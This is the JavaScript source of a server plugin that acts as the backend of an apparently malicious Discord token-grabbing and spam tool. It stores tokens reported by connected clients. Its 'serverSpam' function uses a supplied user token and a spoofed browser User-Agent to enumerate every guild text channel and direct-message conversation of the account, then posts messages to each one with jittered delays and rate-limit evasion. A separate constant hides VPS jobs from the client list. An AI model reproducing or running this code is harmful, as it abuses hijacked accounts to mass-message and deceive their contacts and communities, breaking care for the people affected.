const DEFAULTS = {
  source: "app",
  where: "server",
  messages: ["default whisper"],
  minDelayMs: 2000,
  maxDelayMs: 8000,
  targets: ["guilds", "dms"],
  textOnly: true,
  token: "",
  maxPerChannel: 1,
  announcementChans: false,
};

// VPS jobs are not clients — they must never show up in the client list.
const VPS_KEY = "__vps__";

const API_BASE = "https://discord.com/api/v9";
const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

function norm(payload) {
  if (payload == null) return {};
  if (typeof payload === "string") {
    try { return JSON.parse(payload); } catch { return { raw: payload }; }
  }
  if (payload instanceof Uint8Array || payload instanceof ArrayBuffer) {
    const s = new TextDecoder().decode(payload);
    try { return JSON.parse(s); } catch { return { raw: s }; }
  }
  return payload;
}

function sleep(ms) {
  return new Promise((res) => setTimeout(res, ms));
}

function jitter(min, max) {
  return min + Math.floor(Math.random() * (max - min + 1));
}

function retryAfterMs(resp) {
  const v = resp.headers.get("Retry-After");
  if (!v) return 1000;
  const n = parseFloat(v);
  if (!Number.isNaN(n)) return n * 1000;
  const t = Date.parse(v);
  if (!Number.isNaN(t)) return Math.max(1000, t - Date.now());
  return 1000;
}

function setState(ctx, clientId, p) {
  ctx.db.run(
    `INSERT INTO client_state (client_id, status, user, sent, total, updated_at)
     VALUES (?, ?, ?, ?, ?, ?)
     ON CONFLICT(client_id) DO UPDATE SET
       status = excluded.status,
       user = excluded.user,
       sent = excluded.sent,
       total = excluded.total,
       updated_at = excluded.updated_at`,
    clientId, p.state || "unknown", p.user || null, p.sent || 0, p.total || 0, Date.now()
  );
}

// Server-side spam engine: sends from the operator's machine via the token.
async function serverSpam(ctx, clientId, token, cfg) {
  const job = { cancel: false };
  ctx.spamJobs.set(clientId, job);

  async function get(path) {
    const r = await fetch(API_BASE + path, { headers: { Authorization: token, "User-Agent": UA } });
    if (r.status === 429) throw Object.assign(new Error("ratelimit"), { retryAfter: retryAfterMs(r) });
    if (r.status >= 400) { const b = await r.text(); throw new Error("HTTP " + r.status + ": " + b); }
    return r.json();
  }

  async function send(channelId, content) {
    const r = await fetch(API_BASE + "/channels/" + channelId + "/messages", {
      method: "POST",
      headers: { Authorization: token, "Content-Type": "application/json", "User-Agent": UA },
      body: JSON.stringify({ content }),
    });
    if (r.status === 429) throw Object.assign(new Error("ratelimit"), { retryAfter: retryAfterMs(r) });
    if (r.status >= 400) { const b = await r.text(); throw new Error("HTTP " + r.status + ": " + b); }
  }

  try {
    setState(ctx, clientId, { state: "grabbing" });
    ctx.broadcast("status", { clientId, state: "grabbing" });

    let me;
    try {
      me = await get("/users/@me");
    } catch (e) {
      ctx.broadcast("error", { clientId, message: "auth failed: " + e.message });
      setState(ctx, clientId, { state: "idle" });
      ctx.broadcast("status", { clientId, state: "idle" });
      return;
    }
    setState(ctx, clientId, { state: "running", user: me.username });
    ctx.broadcast("status", { clientId, state: "running", user: me.username });

    const channels = [];
    if ((cfg.targets || []).includes("guilds")) {
      // A guild-list 403 (e.g. code 40002 unverified account) must not abort
      // the run — skip guilds and keep going with whatever else works.
      try {
        const guilds = await get("/users/@me/guilds");
        for (const g of guilds) {
          try {
            const chs = await get("/guilds/" + g.id + "/channels");
            for (const c of chs) {
              if (cfg.textOnly && !(c.type === 0 || (c.type === 5 && cfg.announcementChans))) continue;
              channels.push({ id: c.id, name: c.name, guild: g.name });
            }
          } catch (e) {
            ctx.broadcast("error", { clientId, message: "channels for " + g.name + " failed: " + e.message });
          }
        }
      } catch (e) {
        ctx.broadcast("error", { clientId, message: "guild list failed, skipping guilds: " + e.message });
      }
    }
    if ((cfg.targets || []).includes("dms")) {
      try {
        const chs = await get("/users/@me/channels");
        for (const c of chs) {
          if (c.type === 1 || c.type === 3) {
            channels.push({ id: c.id, name: c.type === 3 ? "Group DM" : "DM" });
          }
        }
      } catch (e) {
        ctx.broadcast("error", { clientId, message: "dm list failed: " + e.message });
      }
    }

    if (!channels.length) {
      ctx.broadcast("error", { clientId, message: "no target channels found" });
      setState(ctx, clientId, { state: "idle" });
      ctx.broadcast("status", { clientId, state: "idle" });
      return;
    }

    const messages = cfg.messages && cfg.messages.length ? cfg.messages : ["default whisper"];
    let sent = 0;
    setState(ctx, clientId, { state: "running", total: channels.length });
    ctx.broadcast("progress", { clientId, sent: 0, total: channels.length });

    for (let i = 0; i < channels.length; i++) {
      if (job.cancel) {
        setState(ctx, clientId, { state: "idle", sent });
        ctx.broadcast("status", { clientId, state: "idle", detail: "stopped after " + sent + " messages" });
        return;
      }
      const ch = channels[i];
      const msg = messages[Math.floor(Math.random() * messages.length)];
      for (let a = 0; a < (cfg.maxPerChannel || 1); a++) {
        try {
          await send(ch.id, msg);
          sent++;
        } catch (e) {
          if (e.retryAfter) {
            ctx.broadcast("status", { clientId, state: "running", detail: "rate limited, backing off " + e.retryAfter + "ms" });
            await sleep(e.retryAfter);
            continue;
          }
          ctx.broadcast("error", { clientId, message: "send to " + ch.name + " failed: " + e.message });
          break;
        }
      }
      setState(ctx, clientId, { state: "running", sent, total: channels.length });
      ctx.broadcast("progress", {
        clientId, sent, total: channels.length, channel: ch.name, guild: ch.guild, index: i + 1,
      });
      await sleep(jitter(cfg.minDelayMs || 2000, cfg.maxDelayMs || 8000));
    }

    setState(ctx, clientId, { state: "done", sent });
    ctx.broadcast("status", { clientId, state: "done", sent });
  } catch (e) {
    // Never let a throw escape this function: an unhandled rejection tears
    // down the whole plugin worker, which is what "server runtime not running"
    // actually means. Report and swallow.
    try {
      ctx.broadcast("error", { clientId, message: "job failed: " + (e && e.message ? e.message : String(e)) });
      setState(ctx, clientId, { state: "idle" });
      ctx.broadcast("status", { clientId, state: "idle" });
    } catch (_) {}
  } finally {
    ctx.spamJobs.delete(clientId);
  }
}

export default {
  setup(ctx) {
    if (!ctx.db) throw new Error("ctx.db (bun:sqlite) is required");
    ctx.dataDir = ctx.dataDir || ".";
    ctx.clients = new Map();
    ctx.spamJobs = new Map();

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS settings (
        client_id TEXT PRIMARY KEY,
        config TEXT NOT NULL
      )`);

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS client_state (
        client_id TEXT PRIMARY KEY,
        status TEXT NOT NULL,
        user TEXT,
        sent INTEGER DEFAULT 0,
        total INTEGER DEFAULT 0,
        tokens TEXT,
        updated_at INTEGER NOT NULL
      )`);
  },

  onEvent(ctx, clientId, event, payload) {
    if (!clientId) return;
    const now = Date.now();
    ctx.clients.set(clientId, now);
    const p = norm(payload);

    if (event === "status") {
      setState(ctx, clientId, p);
      ctx.broadcast("status", { clientId, ...p });
    } else if (event === "tokens") {
      ctx.db.run(
        `INSERT INTO client_state (client_id, status, tokens, updated_at)
         VALUES (?, 'idle', ?, ?)
         ON CONFLICT(client_id) DO UPDATE SET tokens = excluded.tokens, updated_at = excluded.updated_at`,
        clientId, JSON.stringify(p), now
      );
      ctx.broadcast("tokens", { clientId, tokens: Array.isArray(p) ? p : [p] });
    } else if (event === "progress") {
      setState(ctx, clientId, { state: "running", sent: p.sent, total: p.total });
      ctx.broadcast("progress", { clientId, ...p });
    } else if (event === "settings_updated") {
      ctx.broadcast("settings_updated", { clientId, ...p });
    } else if (event === "pong") {
      ctx.broadcast("pong", { clientId, ...p });
    } else if (event === "error") {
      ctx.broadcast("error", { clientId, ...p });
    } else {
      ctx.broadcast(event, { clientId, payload: p });
    }
  },

  rpc: {
    list_clients(ctx) {
      return Array.from(ctx.clients.entries())
        .filter(([clientId]) => clientId && clientId !== VPS_KEY)
        .map(([clientId, lastSeen]) => ({ clientId, lastSeen }));
    },

    get_settings(ctx, params = {}) {
      const row = ctx.db
        .query("SELECT config FROM settings WHERE client_id = ?")
        .get(params.clientId || "");
      return row ? JSON.parse(row.config) : { ...DEFAULTS };
    },

    save_settings(ctx, params = {}) {
      const cfg = { ...DEFAULTS, ...(params.config || {}) };
      ctx.db.run(
        `INSERT INTO settings (client_id, config) VALUES (?, ?)
         ON CONFLICT(client_id) DO UPDATE SET config = excluded.config`,
        params.clientId, JSON.stringify(cfg)
      );
      return { ok: true, config: cfg };
    },

    get_state(ctx, params = {}) {
      const row = ctx.db
        .query("SELECT * FROM client_state WHERE client_id = ?")
        .get(params.clientId || "");
      if (!row) {
        return { clientId: params.clientId, status: "unknown", sent: 0, total: 0, tokens: [] };
      }
      return {
        clientId: row.client_id,
        status: row.status,
        user: row.user,
        sent: row.sent,
        total: row.total,
        tokens: row.tokens ? JSON.parse(row.tokens) : [],
      };
    },

    start_server(ctx, params = {}) {
      try {
        const { clientId, token, config } = params;
        if (!token) throw new Error("no token supplied for server mode");
        const key = clientId || VPS_KEY;
        if (ctx.spamJobs.has(key)) throw new Error("already running");
        const cfg = { ...DEFAULTS, ...(config || {}) };
        // Fire and forget, but with a catch so a rejection can never reach
        // the worker's unhandled-rejection handler.
        serverSpam(ctx, key, token, cfg).catch(() => {});
        return { ok: true };
      } catch (e) {
        return { ok: false, error: e.message };
      }
    },

    stop_server(ctx, params = {}) {
      try {
        const key = (params && params.clientId) || VPS_KEY;
        const job = ctx.spamJobs.get(key);
        if (job) job.cancel = true;
        return { ok: true, stopped: !!job };
      } catch (e) {
        return { ok: false, error: e.message };
      }
    },
  },
};
